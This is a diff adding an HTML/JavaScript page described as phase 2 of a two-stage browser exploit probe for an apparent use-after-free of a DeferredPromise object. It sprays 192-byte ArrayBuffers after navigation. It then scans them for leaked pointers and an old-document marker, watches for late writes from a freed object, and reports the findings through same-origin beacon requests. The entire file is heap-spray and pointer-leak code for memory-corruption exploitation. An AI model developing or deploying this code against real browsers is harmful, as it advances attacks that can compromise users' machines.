@@ -1,0 +1,142 @@
+<!--
+  p656h2: post-navigation watch (phase 2 of 2, target of p656h1)
+
+  Same-origin successor of the forged page. The main-doc teardown released
+  the DeferredPromise ref -> destructor SHOULD have run during/after nav.
+  This page re-sprays 192B ArrayBuffers and:
+    A) scans for old-world residue (T1/W pointers, 0xCCCC0008 marker)
+       in slots recycled from the old document
+    B) watches its own spray for LATE writes (destructor still pending
+       or allocator freelist metadata appearing)
+
+  Handshake via sessionStorage 'p656h.*'.
+  Beacon: P656H2-.
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p656h2</title></head>
+<body>p656h2: post-nav watch
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 2) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P656H2-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+var hs = 'none';
+try { hs = sessionStorage.getItem('p656h.hs') || 'none'; } catch(e) {}
+
+emit('START', 'hs=' + hs);
+flush();
+
+if (hs !== 'ok') {
+  emit('ABORT', 'handshake not ok — phase 1 did not forge');
+  flush();
+  // self-clear so a retry starts fresh
+  try { sessionStorage.removeItem('p656h.hs'); } catch(e) {}
+  setTimeout(function(){ try { location.replace('/p656h1'); } catch(e){} }, 600);
+} else {
+  var t1lo = 0, t1hi = 0, rcPrev = 0, mkPrev = '';
+  try {
+    t1lo = Number(sessionStorage.getItem('p656h.t1lo')) | 0;
+    t1hi = Number(sessionStorage.getItem('p656h.t1hi')) | 0;
+    rcPrev = Number(sessionStorage.getItem('p656h.rc')) | 0;
+    mkPrev = sessionStorage.getItem('p656h.mk') || '';
+  } catch(e) {}
+
+  emit('CTX', 'T1=' + hex32(t1hi) + hex32(t1lo) + ' rc=' + rcPrev + ' mk=' + mkPrev);
+  flush();
+
+  // --- A) residue scan: spray and look for old-world data ---
+  var bufs = [];
+  var residue = [];
+  for (var i = 0; i < 400; i++) {
+    var ab = new ArrayBuffer(192);
+    var dv = new DataView(ab);
+    dv.setUint32(0x00, 0x51510000 + i, true);   // own marker
+    dv.setUint32(0x04, 0xB0BA0009, true);
+    bufs.push({ dv: dv });
+  }
+
+  // give the allocator a moment to hand out old slots
+  setTimeout(function() {
+    var hits = 0;
+    for (var i = 0; i < bufs.length; i++) {
+      var d = bufs[i].dv;
+      for (var off = 0; off < 192; off += 4) {
+        var v = d.getUint32(off, true);
+        if (v !== 0) {
+          // any dword that is NOT ours and NOT zero = residue candidate
+          if (off !== 0x00 && off !== 0x04) {
+            if (v === t1lo) { residue.push('buf' + i + '+0x' + off.toString(16) + '=T1lo'); }
+            else if (v === t1hi && off > 0x40) { residue.push('buf' + i + '+0x' + off.toString(16) + '=T1hi'); }
+            else if (v === 0xCCCC0008) { residue.push('buf' + i + '+0x' + off.toString(16) + '=old-mk'); }
+            else if (v === rcPrev && off === 0x00) { residue.push('buf' + i + '+0x00=old-rc'); }
+          }
+        }
+      }
+    }
+    emit('SCAN', 'bufs=' + bufs.length + ' residue=' + residue.length);
+    if (residue.length) {
+      emit('RESIDUE', residue.slice(0, 20).join(' '));
+    }
+    flush();
+
+    // --- B) late-write watch on our own spray ---
+    var snap = [];
+    for (var i2 = 0; i2 < bufs.length; i2++) {
+      var s2 = [];
+      for (var j = 0; j < 192; j += 4) s2.push(bufs[i2].dv.getUint32(j, true));
+      snap.push(s2);
+    }
+
+    var n = 0;
+    var lateWrites = 0;
+    function watch() {
+      n++;
+      for (var i = 0; i < bufs.length; i++) {
+        var d = bufs[i].dv;
+        for (var j = 0; j < 192; j += 4) {
+          var cur = d.getUint32(j, true);
+          if (cur !== snap[i][j / 4]) {
+            lateWrites++;
+            if (lateWrites <= 10) {
+              emit('LATE', 'buf' + i + '+0x' + j.toString(16) + ':' +
+                hex32(snap[i][j/4]) + '>' + hex32(cur));
+            }
+            snap[i][j / 4] = cur;
+          }
+        }
+      }
+      if (n === 1 || n === 5 || n === 15 || n === 30) {
+        emit('WATCH', 'n=' + n + ' late=' + lateWrites);
+        flush();
+      }
+      if (n < 40) { setTimeout(watch, 120); }
+      else {
+        emit('VERDICT', 'residue=' + residue.length + ' late=' + lateWrites);
+        emit('ALIVE', 'end');
+        flush();
+        try { sessionStorage.removeItem('p656h.hs'); } catch(e) {}
+      }
+    }
+    setTimeout(watch, 80);
+  }, 250);
+}
+
+})();
+</script>
+</body></html>
